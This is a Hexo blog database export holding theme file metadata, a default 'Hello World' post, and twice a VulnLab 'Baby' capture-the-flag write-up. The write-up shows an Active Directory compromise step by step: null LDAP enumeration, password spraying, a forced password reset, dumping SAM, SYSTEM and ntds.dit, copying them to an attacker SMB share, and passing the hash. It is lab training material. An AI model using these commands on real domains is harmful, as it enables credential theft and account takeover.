18804c58239d95798fa86d0597f32d7f7dd30051","modified":1717520977535},{"_id":"themes/butterfly/source/css/_highlight/highlight/diff.styl","hash":"cf1fae641c927621a4df1be5ca4a853b9b526e23","modified":1717520977535},{"_id":"themes/butterfly/source/css/_highlight/prismjs/index.styl","hash":"5dc2e0bcae9a54bfb9bdcc82d02ae5a3cf1ca97d","modified":1717520977535},{"_id":"themes/butterfly/source/css/_highlight/prismjs/diff.styl","hash":"dcd3af96d8be1a6358a88daf2c66165cc9b792d9","modified":1717539913605},{"_id":"themes/butterfly/source/css/_highlight/prismjs/line-number.styl","hash":"25914321762e30aacc610bc4dfb9de3e1cb556a3","modified":1717520977535},{"_id":"source/images/cyber.jpg","hash":"41c46786822b4b05947fc191c395f21f7c192e15","modified":1717524231865},{"_id":"source/images/vl_social.png:Zone.Identifier","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1717527583925},{"_id":"source/images/vl_social.jpg","hash":"1d73cf7b697aae7ae5e9aeab840889a3e3e32937","modified":1717527297172},{"_id":"source/_posts/writeups/vulnlab/baby.md","hash":"69da75d7c518f1126c882a92aef101bdd826141f","modified":1717530050865},{"_id":"source/_posts/baby.md","hash":"b6f526db38706f654d93ab432e7b146898beaac9","modified":1717530209755},{"_id":"source/_posts/baby-vl.md","hash":"c63aa995527a58f323a2f7167594ce87b3819569","modified":1717536743465},{"_id":"source/images/cyberpunk-red.jpg","hash":"8f08f881bc1806d7dd6a649d78b9cd58bbf95c11","modified":1717530572061},{"_id":"source/images/cyberpunk-red.jpg:Zone.Identifier","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1717530605875},{"_id":"source/images/vulnlab/baby-vl/b.png","hash":"532e707e72faceb3fde43365b38d8afea012d8c1","modified":1717020487644},{"_id":"source/images/vulnlab/baby-vl/baby_slide.png","hash":"914571e8610795302b8ebcc70efaeacf9f263c42","modified":1717531472685},{"_id":"source/images/vulnlab/baby-vl/c.png","hash":"4e83afe4a957c21f44ac1c49cde727a4152e0015","modified":1717023415241},{"_id":"source/tags/index.md","hash":"799cbe5084f6ae37beb8712f8a0631e2130f64de","modified":1717538246315}],"Category":[{"name":"Vulnlab","_id":"clx0u1gtl0000ttufdk7w7pc0"},{"name":"vulnlab","_id":"clx0w93qb000067ufedeh9ivq"}],"Data":[],"Page":[{"title":"tags","date":"2024-06-04T21:57:26.000Z","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2024-06-04 17:57:26\n---\n","updated":"2024-06-04T21:57:26.315Z","path":"tags/index.html","comments":1,"layout":"page","_id":"clx0xxmil0000iguf7d9v72zb","content":"","cover":false,"excerpt":"","more":""}],"Post":[{"title":"Hello World","_content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\n---\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","slug":"hello-world","published":1,"date":"2024-06-04T17:09:04.125Z","updated":"2024-06-04T17:09:04.125Z","comments":1,"layout":"post","photos":[],"_id":"clx0nq8y4000038ufcvvfgi8o","content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n","cover":false,"excerpt":"","more":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n"},{"title":"Baby - VulnLab","date":"2024-06-04T19:43:29.000Z","keywords":"Vulnlab, Easy, AD","description":"This machine is a more beginner-level Active Directory machine, however it's very useful if you want to understand fundamentals of AD and how to exploit it. You'll see a lot of techniques here in more difficult machines (though they may be used differently).","cover":"/images/vulnlab/baby-vl/baby_slide.png","top_img":"/images/vulnlab/baby-vl/baby_slide.png","toc":true,"toc_number":false,"_content":"\n\nThis machine is a more beginner-level Active Directory machine, however it's very useful if you want to understand fundamentals of AD and how to exploit it. You'll see a lot of techniques here in more difficult machines (though they may be used differently).\n\n# Enumeration\n\nWith that, let's run our base NMAP scan.\n\n```Kali\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 17:18 EDT\nNmap scan report for 10.10.99.70\nHost is up (0.11s latency).\nNot shown: 987 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n3389/tcp open  ms-wbt-server\n5357/tcp open  wsdapi\n\nNmap done: 1 IP address (1 host up) scanned in 17.63 seconds\n```\n\nYou'll see that we have a few ports to look at initially, notably SMB and LDAP. There is no initial web service, so we'll check out the former ports. Let's run another NMAP scan against the LDAP service so we can grab the NetBIOS name and FQDN of the machine.\n\n\n```Kali\n└─$ sudo nmap 10.10.99.70 -A\n\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)\n|   DNS_Computer_Name: BabyDC.baby.vl\n| ssl-cert: Subject: commonName=BabyDC.baby.vl\n```\n\nLet's add these to our `/etc/hosts` file so we can resolve any future enumeration techniques to the correct DNS name. Furthermore, attempting to authenticate to SMB seems to not return anything in particular.\n\n```Kali\n└─$ smbclient -L 10.10.99.70 -N\nAnonymous login successful\n\n        Sharename       Type      Comment\n        ---------       ----      -------\nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.99.70 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\nSMB does not seem to be helpful as of right now, so let's try to focus on LDAP. Normally, it's an extremely insecure practice to allow null LDAP enumeration. That being said, there's no harm in trying to run a few queries with LDAP to test for any responses.\n\n# LDAP Enumeration\n\nLet's first test for null authentication and query LDAP for all domain objects in the domain.\n\n```Kali\n└─$ ldapsearch -x -H ldap://BabyDC.baby.vl:389 -D '' -w '' -b \"DC=baby,DC=vl\"\n\n# extended LDIF\n#\n# LDAPv3\n# base <DC=baby,DC=vl> with scope subtree\n# filter: (objectclass=*)\n# requesting: ALL\n#\n\n# baby.vl\ndn: DC=baby,DC=vl\n\n# Administrator, Users, baby.vl\ndn: CN=Administrator,CN=Users,DC=baby,DC=vl\n[...snip...]\n```\n\nYou can see from the result that all of the domain objects were returned, meaning that we are able to query LDAP for essentially any domain object we'd like. If we were on a Windows workstation that was within the domain, we could use tools like `ADSearch` or `PowerView` to query for any users, groups, essentially any domain object we'd like.\n\nLet's adjust our LDAP search query so we can create a user list.\n\n```Kali\n└─$ ldapsearch -x -H ldap://BabyDC.baby.vl:389 -D '' -w '' -b \"DC=baby,DC=vl\" | grep '@baby.vl' | awk '{print $2}' | cut -d '@' -f 1 > ul.txt; cat ul.txt\n\nJacqueline.Barnett\nAshley.Webb\nHugh.George\nLeonard.Dyer\nConnor.Wilkinson\nJoseph.Hughes\nKerry.Wilson\nTeresa.Bell\n```\n\nI was getting ready to run some tests using this wordlist, but if you do a quick check over the LDAP dump you'll see that we missed a few users. I wasn't certain if this was an LDAP issue or a `grep` issue, but nonetheless I copied the remaining users into the wordlist. (`Caroline.Robinson` and `Ian.Walker`)\n\nYou'll notice at the end of the same full LDAP dump output under `Teresa.Bell`, there seems to be a description comment that says `description: Set initial password to [...snip...`.\n\nWe can infer based on the message that this is the initial password for users when they are created. Now that we have a list of users and a potential password, we can use `crackmapexec` to test if any users have this password still set to their account. We'll use SMB as our service to test against since we really don't need to query anything for LDAP anymore (since we can already dump the entire domain with null credentials).\n\n```Kali\n└─$ for user in $(cat ul.txt); do crackmapexec smb BabyDC.baby.vl -u $user -p 'BabyStart123!'; done\n\n[...snip...]\nSMB         BabyDC.baby.vl  445    BABYDC           [-] baby.vl\\Caroline.Robinson:[...snip...] STATUS_PASSWORD_MUST_CHANGE\n[...snip...]\n```\n\nYou'll notice that we'll get a hit on `Caroline.Robinson`, stating that their password needs to change. This more than likely is notifying us that the user has not done their initial authentication to the domain yet or that they have gone past the password reset policy deadline. This can be the case with new employees and/or interns.\n\n# Password Reset with SMBPasswd\n\nIn that case let's try to reset their password with `smbpasswd`. The only pre-reqs to this is that we specify the username and the specific remote machine we want to change it for.\n\n```Kali\nsmbpasswd -r BabyDC.baby.vl -U BABYDC/'Caroline.Robinson'\n\nOld SMB password: ([...snip...])\nNew SMB password: password123@\nRetype new SMB password: password123@\nPassword changed for user Caroline.Robinson\n```\n\nIf we test the same `crackmapexec` command as above for `Caroline.Robinson`, we can see that their password was successfully updated. Normally I'd now dump the LDAP with bloodhound to get all of the domain objects into a GUI, but if we test `crackmapexec` against WinRM we can see that we already are able to login as this user.\n\n```Kali\n└─$ crackmapexec winrm BabyDC.baby.vl -u 'Caroline.Robinson' -p 'password123@'\nSMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)\nHTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman\nWINRM       BabyDC.baby.vl  5985   BABYDC           [+] baby.vl\\Caroline.Robinson:password123@ (Pwn3d!)\n```\n\nAfter logging in, you can find the user flag within the user's Desktop directory.\n\n![image1](/images/vulnlab/baby-vl/b.png \"B\")\n\n# Privilege Escalation w/ SeBackupPrivilege\n\nLet's do a quick privilege to see if there's anything that we can exploit.\n\n```Evil-WinRM\n*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents> whoami /priv\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeBackupPrivilege             Back up files and directories  Enabled\nSeRestorePrivilege            Restore files and directories  Enabled\n[...snip...]\n```\n\nYou'll see from the output that we have `SeBackupPrivilege` enabled for our user. This essentially means that we can backup various parts of the filesystem. In most cases, this can be for a engineer or technical support user and seems harmless at first glance. However, this means we can also backup sensitive files such as the `SAM` and `SYSTEM` databases. These database essentially house user accounts and security objects for all domain objects on the machine. The only issue is that this also houses user passwords, meaning if we dump these databases we can view the password for every user on the machine.\n\nSo first, let's dump both of these databases into a temporary directory.\n\n```Evil-WinRM\n*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents> mkdir C:\\temp\n*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents> reg save hklm\\sam c:\\temp\\sam\n*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents> reg save hklm\\system c:\\temp\\system\n```\n\nThese files will now be saved to our temporary directory, in which we can download them to our local machine. This machine does have AV enabled so we won't be able to set up a simple C2 server's without obfuscating our payloads, meaning we'll need to find a way to transfer our files back and forth in a inconspicuous manner.\n\nWe can use Impacket's `smbserver` to spin up a quick SMB server, to which we can then transfer our files to our Kali machine.\n\n```Evil-WinRM -> Kali\n└─$ mkdir share/\n\n└─$ impacket-smbserver smb share/ -smb2support\n\n*Evil-WinRM* PS C:\\temp> copy sam \\\\(Kali IP)\\smb\\sam\n*Evil-WinRM* PS C:\\temp> copy system \\\\(Kali IP)\\smb\\system\n```\n\nYou'll notice a lot of output from our SMB server when we're copying the files over, this is just a built-in Impacket functionality that will dump the user's NetNTLM hash when they authenticate to our SMB server. We can ignore this, and if we look at the `share/` directory we'll see the two files that we downloaded are in this folder.\n\nNow that we have both of these files, let's run `samdump` on them to retrieve credentials that are within these two databases.\n\n```Kali\n└─$ samdump2 system sam\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::\n*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n*disabled* ä:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n```\n\nNow that we have the Administrator's hash, let's test the creds once more with `crackmapexec` and by passing the hash to it.\n\n```Kali\n└─$ crackmapexec winrm BabyDC.baby.vl -u 'Administrator' -H '[...snip...]'\nSMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)\nHTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman\nWINRM       BabyDC.baby.vl  5985   BABYDC           [-] baby.vl\\Administrator:[...snip...]\n```\n\nThe thing is, this will fail. The Administrator hash above is not an Administrator hash that we can login with. There is a hash of an account with the same username on the DC, meaning we'll need to look a little further with our `SeBackupPrivilege` to dump another file.\n\n# Diskshadow/Robocopy for NTDS.dit\n\nThe file in particular that we're looking for is a copy of the `C:\\`'s ntds database, which stores Active Directory information of the respective filesystem path. We can use this along with our previously obtained `SAM` and `SYSTEM` databases to dump the AD secrets of the domain controller.\n\nTo exploit this, we can use `diskshadow` and `robocopy` to create a copy of the current drive and copy the copied filesystem back to the `C:\\` drive. (Credit goes to Nairuz Abulhul for their explanation of this exploit in their article [here](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960).)\n\nLet's first create a file named `script.txt` and transfer it to our `Evil-WinRM` session. The contents of the script can be seen below.\n\n```diskshadow\nset metadata C:\\Windows\\Temp\\meta.cabX\nset context clientaccessibleX\nset context persistentX\nbegin backupX\nadd volume C: alias cdriveX\ncreateX\nexpose %cdrive% E:X\nend backupX\n```\n\n1. `set metadata C:\\Windows\\Temp\\meta.cabX`: This command is setting metadata for the backup operation. It seems to be specifying the location where metadata related to the backup will be stored, in this case, `C:\\Windows\\Temp\\meta.cabX`.\n    \n2. `set context clientaccessibleX`: This command is setting the context for the backup operation. It seems to be specifying that the backup should be accessible by the client. The `X` might be a placeholder or a variable.\n    \n3. `set context persistentX`: This command is setting another context for the backup operation. It could be specifying that the backup should be persistent, meaning it should remain available or stored for a certain period. The `X` might be a placeholder or a variable.\n    \n4. `begin backupX`: This command is initiating the backup operation. The `X` might be a placeholder or a variable.\n    \n5. `add volume C: alias cdriveX`: This command is adding the volume `C:` to the backup operation with an alias `cdriveX`. This means that the contents of the `C:` drive will be included in the backup. The `X` might be a placeholder or a variable.\n    \n6. `createX`: This command is creating something related to the backup operation. It's not entirely clear what it's creating without more context or additional information about the script.\n    \n7. `expose %cdrive% E:X`: This command seems to be exposing the contents of the `C:` drive, which was added to the backup operation with the alias `cdriveX`, to a location specified by `%cdrive%` on drive `E:`. This might involve mounting the backup or making it accessible in some way. The `X` might be a placeholder or a variable.\n    \n8. `end backupX`: This command is ending the backup operation. The `X` might be a placeholder or a variable.\n\nLet's set up a simple Python server so we can curl this script to our WinRM session.\n\n```Kali\n└─$ python3 -m http.server 9001\n\n*Evil-WinRM* PS C:\\temp> curl http://(Kali IP):9001/script.txt -O script.txt\n```\n\nNext, let's run `diskshadow` to create a copy of the `C:\\` drive.\n\n```Evil-WinRM\ndiskshadow /s script.txt\n```\n\nAfter the filesystem copy finishes, it will be saved to `E:\\Windows`. This is where we can use `robocopy` to move it back to our `C:\\` drive.\n\n`robocopy /b E:\\Windows\\ntds . ntds.dit`\n\nLet's now use our SMB server on our Kali machine to download the `ntds.dit` file from the WinRM session.\n\n```Evil-WinRM\n*Evil-WinRM* PS C:\\temp> copy ntds.dit \\\\10.8.0.173\\smb\\ntds.dit\n```\n\nFrom here, all that's left to do is retrieve the correct NTLM hashes by dumping the DC secrets with `impacket-secretsdump`.\n\n```Kali\nimpacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nBABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::\n```\n\nThis will dump the NTLM hashes for every user that has the ability to login to a service on the domain controller. At the bottom of the output, you'll find hashes for all of the AD users that we dumped through LDAP at the beginning of this machine.\n\nUnderneath `[*] Reading and decrypting hashes from ntds.dit`, we'll find the correct NTLM hash for the Administrator user. We can verify our ability to connect with this using `crackmapexec` once more.\n\n```Kali\n└─$ crackmapexec winrm BabyDC.baby.vl -u 'Administrator' -H '[...snip...]'\nSMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)\nHTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman\nWINRM       BabyDC.baby.vl  5985   BABYDC           [+] baby.vl\\Administrator:[...snip...] (Pwn3d!)\n```\n\nThus, we have the ability to log in through WinRM as the Administrator. The root hash can be found within the Administrator's Desktop directory.\n\n![image2](/images/vulnlab/baby-vl/c.png \"C\")\n\n# Conclusion\n\nThis means we have rooted this machine! Credit goes to xct for the development of this machine. As said previously, this machine is really helpful if you want to learn Active Directory basics.\n\n# Resources\n\nhttps://lonewolf.my.site.com/s/article/DPN-Reset-Samba-Passwords#:~:text=At%20the%20%23%20prompt%20type%20in,is%20to%20reset%20the%20password.&text=To%20set%20up%20a%20new,will%20ask%20for%20the%20password\nhttps://github.com/BishopFox/sliver\nhttps://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960\n\n\n","source":"_posts/baby-vl.md","raw":"---\ntitle: Baby - VulnLab\ndate: 2024-06-04 15:43:29\ntags: [vulnlab, Easy]\ncategories: vulnlab\nkeywords: 'Vulnlab, Easy, AD'\ndescription: This machine is a more beginner-level Active Directory machine, however it's very useful if you want to understand fundamentals of AD and how to exploit it. You'll see a lot of techniques here in more difficult machines (though they may be used differently).\ncover: /images/vulnlab/baby-vl/baby_slide.png\ntop_img: /images/vulnlab/baby-vl/baby_slide.png\ntoc: true\ntoc_number: false\n---\n\n\nThis machine is a more beginner-level Active Directory machine, however it's very useful if you want to understand fundamentals of AD and how to exploit it. You'll see a lot of techniques here in more difficult machines (though they may be used differently).\n\n# Enumeration\n\nWith that, let's run our base NMAP scan.\n\n```Kali\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 17:18 EDT\nNmap scan report for 10.10.99.70\nHost is up (0.11s latency).\nNot shown: 987 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n3389/tcp open  ms-wbt-server\n5357/tcp open  wsdapi\n\nNmap done: 1 IP address (1 host up) scanned in 17.63 seconds\n```\n\nYou'll see that we have a few ports to look at initially, notably SMB and LDAP. There is no initial web service, so we'll check out the former ports. Let's run another NMAP scan against the LDAP service so we can grab the NetBIOS name and FQDN of the machine.\n\n\n```Kali\n└─$ sudo nmap 10.10.99.70 -A\n\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)\n|   DNS_Computer_Name: BabyDC.baby.vl\n| ssl-cert: Subject: commonName=BabyDC.baby.vl\n```\n\nLet's add these to our `/etc/hosts` file so we can resolve any future enumeration techniques to the correct DNS name. Furthermore, attempting to authenticate to SMB seems to not return anything in particular.\n\n```Kali\n└─$ smbclient -L 10.10.99.70 -N\nAnonymous login successful\n\n        Sharename       Type      Comment\n        ---------       ----      -------\nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.99.70 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\nSMB does not seem to be helpful as of right now, so let's try to focus on LDAP. Normally, it's an extremely insecure practice to allow null LDAP enumeration. That being said, there's no harm in trying to run a few queries with LDAP to test for any responses.\n\n# LDAP Enumeration\n\nLet's first test for null authentication and query LDAP for all domain objects in the domain.\n\n```Kali\n└─$ ldapsearch -x -H ldap://BabyDC.baby.vl:389 -D '' -w '' -b \"DC=baby,DC=vl\"\n\n# extended LDIF\n#\n# LDAPv3\n# base <DC=baby,DC=vl> with scope subtree\n# filter: (objectclass=*)\n# requesting: ALL\n#\n\n# baby.vl\ndn: DC=baby,DC=vl\n\n# Administrator, Users, baby.vl\ndn: CN=Administrator,CN=Users,DC=baby,DC=vl\n[...snip...]\n```\n\nYou can see from the result that all of the domain objects were returned, meaning that we are able to query LDAP for essentially any domain object we'd like. If we were on a Windows workstation that was within the domain, we could use tools like `ADSearch` or `PowerView` to query for any users, groups, essentially any domain object we'd like.\n\nLet's adjust our LDAP search query so we can create a user list.\n\n```Kali\n└─$ ldapsearch -x -H ldap://BabyDC.baby.vl:389 -D '' -w '' -b \"DC=baby,DC=vl\" | grep '@baby.vl' | awk '{print $2}' | cut -d '@' -f 1 > ul.txt; cat ul.txt\n\nJacqueline.Barnett\nAshley.Webb\nHugh.George\nLeonard.Dyer\nConnor.Wilkinson\nJoseph.Hughes\nKerry.Wilson\nTeresa.Bell\n```\n\nI was getting ready to run some tests using this wordlist, but if you do a quick check over the LDAP dump you'll see that we missed a few users. I wasn't certain if this was an LDAP issue or a `grep` issue, but nonetheless I copied the remaining users into the wordlist. (`Caroline.Robinson` and `Ian.Walker`)\n\nYou'll notice at the end of the same full LDAP dump output under `Teresa.Bell`, there seems to be a description comment that says `description: Set initial password to [...snip...`.\n\nWe can infer based on the message that this is the initial password for users when they are created. Now that we have a list of users and a potential password, we can use `crackmapexec` to test if any users have this password still set to their account. We'll use SMB as our service to test against since we really don't need to query anything for LDAP anymore (since we can already dump the entire domain with null credentials).\n\n```Kali\n└─$ for user in $(cat ul.txt); do crackmapexec smb BabyDC.baby.vl -u $user -p 'BabyStart123!'; done\n\n[...snip...]\nSMB         BabyDC.baby.vl  445    BABYDC           [-] baby.vl\\Caroline.Robinson:[...snip...] STATUS_PASSWORD_MUST_CHANGE\n[...snip...]\n```\n\nYou'll notice that we'll get a hit on `Caroline.Robinson`, stating that their password needs to change. This more than likely is notifying us that the user has not done their initial authentication to the domain yet or that they have gone past the password reset policy deadline. This can be the case with new employees and/or interns.\n\n# Password Reset with SMBPasswd\n\nIn that case let's try to reset their password with `smbpasswd`. The only pre-reqs to this is that we specify the username and the specific remote machine we want to change it for.\n\n```Kali\nsmbpasswd -r BabyDC.baby.vl -U BABYDC/'Caroline.Robinson'\n\nOld SMB password: ([...snip...])\nNew SMB password: password123@\nRetype new SMB password: password123@\nPassword changed for user Caroline.Robinson\n```\n\nIf we test the same `crackmapexec` command as above for `Caroline.Robinson`, we can see that their password was successfully updated. Normally I'd now dump the LDAP with bloodhound to get all of the domain objects into a GUI, but if we test `crackmapexec` against WinRM we can see that we already are able to login as this user.\n\n```Kali\n└─$ crackmapexec winrm BabyDC.baby.vl -u 'Caroline.Robinson' -p 'password123@'\nSMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)\nHTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman\nWINRM       BabyDC.baby.vl  5985   BABYDC           [+] baby.vl\\Caroline.Robinson:password123@ (Pwn3d!)\n```\n\nAfter logging in, you can find the user flag within the user's Desktop directory.\n\n![image1](/images/vulnlab/baby-vl/b.png \"B\")\n\n# Privilege Escalation w/ SeBackupPrivilege\n\nLet's do a quick privilege to see if there's anything that we can exploit.\n\n```Evil-WinRM\n*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents> whoami /priv\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeBackupPrivilege             Back up files and directories  Enabled\nSeRestorePrivilege            Restore files and directories  Enabled\n[...snip...]\n```\n\nYou'll see from the output that we have `SeBackupPrivilege` enabled for our user. This essentially means that we can backup various parts of the filesystem. In most cases, this can be for a engineer or technical support user and seems harmless at first glance. However, this means we can also backup sensitive files such as the `SAM` and `SYSTEM` databases. These database essentially house user accounts and security objects for all domain objects on the machine. The only issue is that this also houses user 